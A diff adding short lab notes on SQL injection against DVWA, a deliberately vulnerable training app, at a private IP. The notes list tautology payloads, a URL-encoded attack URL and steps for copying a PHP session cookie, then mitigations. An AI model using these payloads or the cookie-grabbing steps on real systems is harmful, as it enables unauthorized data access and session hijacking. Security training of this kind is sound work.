@@ -1,0 +1,41 @@
+Let's try
+
+' OR '1'='1' --
+
+Let's try
+
+' OR 1=1 #
+
+Let's try
+
+' OR '1'='1
+
+So This One Worked
+
+You Can Url Encode It To
+
+%27%20OR%20%271%27%3D%271
+
+Add It To The Url
+
+http://192.168.1.105/vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit
+
+How to Get PHP Session ID in Browser
+
+Open Developer Tools (F12 or Ctrl+Shift+I).
+Go to the Application tab -> Cookies
+Find PHPSESSID and copy its value.
+
+PHPSESSID: ved2kaqdcqqu33n0iepi7tr430
+
+Run dvwa_sqli.py (If on Windows Make Sure Curl Is Installed)
+
+
+
+Ways To Mitigate
+
+- Implement Custom Input Validation: Filter Before processing user input, validate it against a strict whitelist of allowed characters. For example, if you expect a numeric ID, ensure that the input is numeric.
+
+- Error Handling: Don’t show detailed error messages to the end-user.
+
+- Least Privilege Principle: Use a database account with minimal permissions. Even if an injection occurs, the attacker won’t have full access to your database.
